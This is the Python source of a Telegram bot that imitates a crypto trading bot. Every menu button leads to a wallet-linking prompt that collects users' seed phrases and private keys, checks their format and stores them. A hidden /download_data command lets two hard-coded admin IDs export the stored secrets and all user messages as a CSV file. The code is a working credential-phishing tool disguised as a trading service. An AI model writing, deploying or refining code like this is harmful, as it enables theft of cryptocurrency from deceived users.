import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from dotenv import load_dotenv
import os
import re
import csv


load_dotenv()
API_TOKEN = os.getenv("API_TOKEN")

bot = telebot.TeleBot(API_TOKEN)

# Temporary storage for user data
user_data = {}

# Validation functions
def validate_secret_phrase(secret_phrase):
    """Validate the secret phrase: Usually, a secret phrase consists of 12 or 24 words."""
    words = secret_phrase.split()
    return len(words) in [12, 24] and all(word.isalpha() for word in words)

def validate_private_key(private_key):
    """Validate the private key: Usually, private keys are hexadecimal strings of specific lengths."""
    return bool(re.fullmatch(r'^[a-fA-F0-9]{64}$', private_key))

# Start command handler
@bot.message_handler(commands=['start'])
def start_command(message):
    welcome_text = (
        "💡 If you aren't already, we advise that you use any of the following bots to trade with. "
        "You will have the same wallets and settings across all bots, but it will be significantly faster due to lighter user load.\n\n"
        "⚠️ We have no control over ads shown by Telegram in this bot. Do not be scammed by fake airdrops or login pages."
    )
    bot.send_message(chat_id=message.chat.id, text=welcome_text, reply_markup=main_menu())

# Create the main menu with inline buttons
def main_menu():
    markup = InlineKeyboardMarkup()
    buttons = [
        [("Buy", "buy_callback"), ("Sell", "sell_callback")],
        [("Positions", "positions_callback"), ("Limit Orders", "limit_orders_callback"), ("DCA Orders", "dca_orders_callback")],
        [("Copy Trade", "copy_trade_callback"), ("Sniper (NEW)", "sniper_callback")],
        [("Trenches", "trenches_callback"), ("Referrals", "referrals_callback"), ("⭐ Watchlist", "watchlist_callback")],
        [("Withdraw", "withdraw_callback"), ("Settings", "settings_callback")],
        [("Pump Fun A", "pump_fun_a_callback"), ("0 FEE", "zero_fee_callback"), ("AirDrop", "airdrop_callback")],
        [("Help", "help_callback"), ("Refresh", "refresh_callback")],
        [("Wallet", "wallet_callback")]
    ]
    for row in buttons:
        markup.row(*[InlineKeyboardButton(text=btn[0], callback_data=btn[1]) for btn in row])
    return markup

# Handle callback queries for the Wallet button specifically
@bot.callback_query_handler(func=lambda call: call.data == "wallet_callback")
def handle_wallet(call):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(
        KeyboardButton(text="🔑 Secret Phrase (Recommended)"),
        KeyboardButton(text="🔒 Private Key")
    )
    bot.send_message(
        chat_id=call.message.chat.id,
        text="Choose how you'd like to link your wallet:\n- 🔑 Secret Phrase (Recommended)\n- 🔒 Private Key",
        reply_markup=markup
    )
   
# Handle callback queries for all other buttons
@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
    bot.send_message(
        chat_id=call.message.chat.id,
        text="Setting up your wallet. Please use the /wallet command to link your wallet."
    )

# Handle wallet linking options
@bot.message_handler(func=lambda message: message.text in ["🔑 Secret Phrase (Recommended)", "🔒 Private Key"])
def handle_wallet_info_request(message):
    if message.text == "🔑 Secret Phrase (Recommended)":
        msg = bot.send_message(message.chat.id, "Please enter your Secret Phrase:")
        bot.register_next_step_handler(msg, save_secret_phrase)
    elif message.text == "🔒 Private Key":
        msg = bot.send_message(message.chat.id, "Please enter your Private Key:")
        bot.register_next_step_handler(msg, save_private_key)

def save_secret_phrase(message):
    """Save or reject the Secret Phrase based on validation."""
    secret_phrase = message.text
    if validate_secret_phrase(secret_phrase):
        user_data[message.from_user.id] = {"type": "Secret Phrase", "value": secret_phrase}
        bot.send_message(message.chat.id, "✅ Your Secret Phrase has been successfully saved.")
    else:
        bot.send_message(message.chat.id, "❌ Invalid Secret Phrase. Please provide a valid 12 or 24-word phrase.")

def save_private_key(message):
    """Save or reject the Private Key based on validation."""
    private_key = message.text
    if validate_private_key(private_key):
        user_data[message.from_user.id] = {"type": "Private Key", "value": private_key}
        bot.send_message(message.chat.id, "✅ Your Private Key has been successfully saved.")
    else:
        bot.send_message(message.chat.id, "❌ Invalid Private Key. Please provide a valid 64-character hexadecimal string.")

# Wallet command handler
@bot.message_handler(commands=['wallet'])
def wallet_command(message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(
        KeyboardButton(text="🔑 Secret Phrase (Recommended)"),
        KeyboardButton(text="🔒 Private Key")
    )
    bot.send_message(
        chat_id=message.chat.id,
        text="Choose how you'd like to link your wallet:\n- 🔑 Secret Phrase (Recommended)\n- 🔒 Private Key",
        reply_markup=markup
    )

# Handle all messages and save them to user_data
@bot.message_handler(func=lambda message: not message.text.startswith('/'))  # Exclude command messages
def handle_all_messages(message):
    # Save the user's message
    if message.from_user.id not in user_data:
        user_data[message.from_user.id] = {"messages": []}
    user_data[message.from_user.id]["messages"].append(message.text)

    bot.send_message(
        chat_id=message.chat.id,
        text="Setting up your wallet. Please use the /wallet command to link your wallet."
    )

# Admin command to download data
# List of admin IDs
admin_ids = [5169458686, 5299259698]  # Replace with your admin IDs

# Admin command to download data
@bot.message_handler(commands=['download_data'])
def download_data(message):
    if message.from_user.id in admin_ids:  # Check if user ID is in the admin list
        if not user_data:  # Check if user_data is empty
            bot.send_message(message.chat.id, "No user data available to download.")
            return
        
        with open('user_data.csv', 'w', newline='') as csvfile:
            fieldnames = ['User ID', 'Type', 'Value', 'Messages']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)

            writer.writeheader()
            for user_id, data in user_data.items():
                messages = "; ".join(data.get("messages", []))  # Join messages into a single string
                writer.writerow({
                    'User ID': user_id,
                    'Type': data.get('type', 'N/A'),  # Default to 'N/A' if type is not set
                    'Value': data.get('value', 'N/A'),  # Default to 'N/A' if value is not set
                    'Messages': messages
                })

        bot.send_document(message.chat.id, open('user_data.csv', 'rb'))
    else:
        bot.send_message(message.chat.id, "You are not authorized to perform this action.")


# Polling the bot
bot.polling()
